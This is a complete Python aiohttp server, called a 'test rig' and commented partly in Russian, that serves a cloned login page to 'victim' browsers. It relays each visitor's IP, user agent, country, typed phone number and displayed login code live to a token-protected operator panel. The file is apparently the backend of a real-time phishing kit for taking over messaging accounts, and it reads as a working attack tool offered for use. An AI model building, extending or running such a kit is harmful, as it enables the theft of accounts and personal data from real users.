# server.py — sup test rig: serves the clone + operator panel, bridges via WS.
# requirements: aiohttp>=3.9,<4 (см. requirements.txt)
# env:
#   SUP_HOST   — bind host (default 127.0.0.1)
#   SUP_PORT   — bind port (default 8080)
#   SUP_TOKEN  — operator panel token; if empty, рандом сгенерится при старте
#   SUP_NO_BROWSER=1 — не открывать панель автоматом
#
# запуск:
#   pip install -r requirements.txt
#   python server.py

from __future__ import annotations

import asyncio
import json
import logging
import os
import secrets
import time
import webbrowser
from pathlib import Path
from typing import Any

from aiohttp import WSMsgType, web

ROOT = Path(__file__).parent
HOST = os.environ.get("SUP_HOST", "127.0.0.1")
PORT = int(os.environ.get("SUP_PORT", "8080"))
TOKEN = os.environ.get("SUP_TOKEN") or secrets.token_urlsafe(8)
OPEN_BROWSER = os.environ.get("SUP_NO_BROWSER") != "1"

log = logging.getLogger("sup")

# ---------------- in-memory hub ----------------
SESSIONS: dict[str, dict[str, Any]] = {}   # sid -> {ws, info}
OPS: set[web.WebSocketResponse] = set()


def _public_info(info: dict[str, Any]) -> dict[str, Any]:
    # то что показываем оператору
    return {
        "sid": info["sid"],
        "ip": info["ip"],
        "ua": info["ua"],
        "joined": info["joined"],
        "last": info["last"],
        "screen": info["screen"],
        "country": info["country"],
        "phone": info["phone"],
        "code": info["code"],
    }


async def _broadcast(event: dict[str, Any]) -> None:
    payload = json.dumps(event, ensure_ascii=False)
    dead: list[web.WebSocketResponse] = []
    for ws in OPS:
        if ws.closed:
            dead.append(ws)
            continue
        try:
            await ws.send_str(payload)
        except Exception:
            dead.append(ws)
    for ws in dead:
        OPS.discard(ws)


# ---------------- HTTP routes ----------------
async def index(request: web.Request) -> web.StreamResponse:
    return web.FileResponse(ROOT / "index.html")


async def op_page(request: web.Request) -> web.StreamResponse:
    if request.query.get("k") != TOKEN:
        return web.Response(status=401, text="unauthorized")
    return web.FileResponse(ROOT / "op.html")


async def static_file(request: web.Request) -> web.StreamResponse:
    name = request.match_info["name"]
    # whitelist чтоб не отдавать левое
    allow = {"styles.css", "app.js", "op.css", "op.js"}
    if name not in allow:
        raise web.HTTPNotFound()
    return web.FileResponse(ROOT / name)


# ---------------- WS: victim ----------------
async def victim_ws(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)

    sid = secrets.token_urlsafe(6)
    now = time.time()
    info: dict[str, Any] = {
        "sid": sid,
        "ip": request.headers.get("X-Forwarded-For", request.remote or "?"),
        "ua": request.headers.get("User-Agent", ""),
        "joined": now,
        "last": now,
        "screen": "qr",
        "country": None,
        "phone": "",
        "code": None,
    }
    SESSIONS[sid] = {"ws": ws, "info": info}
    log.info("victim join sid=%s ip=%s", sid, info["ip"])
    await _broadcast({"type": "join", "session": _public_info(info)})

    try:
        async for msg in ws:
            if msg.type != WSMsgType.TEXT:
                continue
            try:
                data = json.loads(msg.data)
            except Exception:
                continue
            t = data.get("type")
            v = data.get("value")
            info["last"] = time.time()
            if t == "screen":
                info["screen"] = v
            elif t == "country":
                # v: {"name": "...", "code": "..", "flag": ".."}
                info["country"] = v
            elif t == "phone_input":
                info["phone"] = str(v or "")
            elif t == "phone_submit":
                info["phone"] = str(v or "")
            elif t == "code_shown":
                info["code"] = str(v or "")
            else:
                # unknown event — пропускаем
                continue
            await _broadcast({"type": "event", "sid": sid, "kind": t, "value": v, "session": _public_info(info)})
    finally:
        SESSIONS.pop(sid, None)
        log.info("victim leave sid=%s", sid)
        await _broadcast({"type": "leave", "sid": sid})

    return ws


# ---------------- WS: operator ----------------
async def op_ws(request: web.Request) -> web.WebSocketResponse:
    if request.query.get("k") != TOKEN:
        return web.Response(status=401, text="unauthorized")  # type: ignore[return-value]
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    OPS.add(ws)
    log.info("op connect (total=%d)", len(OPS))
    try:
        snapshot = [_public_info(s["info"]) for s in SESSIONS.values()]
        await ws.send_str(json.dumps({"type": "snapshot", "sessions": snapshot}))
        async for msg in ws:
            # сейчас панель только слушает; команды можно добавить позже
            if msg.type != WSMsgType.TEXT:
                continue
    finally:
        OPS.discard(ws)
        log.info("op disconnect (total=%d)", len(OPS))
    return ws


# ---------------- app factory ----------------
def make_app() -> web.Application:
    app = web.Application()
    app.add_routes(
        [
            web.get("/", index),
            web.get("/op", op_page),
            web.get("/{name:[^/]+\\.(?:css|js)}", static_file),
            web.get("/ws/v", victim_ws),
            web.get("/ws/op", op_ws),
        ]
    )
    return app


async def _open_panel_later(url: str) -> None:
    await asyncio.sleep(0.7)
    try:
        webbrowser.open(url)
    except Exception as e:
        log.warning("webbrowser.open failed: %s", e)


def main() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    app = make_app()
    panel_url = f"http://{HOST}:{PORT}/op?k={TOKEN}"
    clone_url = f"http://{HOST}:{PORT}/"

    print("=" * 60)
    print(f"  clone:  {clone_url}")
    print(f"  panel:  {panel_url}")
    print(f"  token:  {TOKEN}")
    print("=" * 60)

    async def _on_startup(_app: web.Application) -> None:
        if OPEN_BROWSER:
            asyncio.create_task(_open_panel_later(panel_url))

    app.on_startup.append(_on_startup)
    web.run_app(app, host=HOST, port=PORT, access_log=None, print=lambda *_a, **_k: None)


if __name__ == "__main__":
    main()
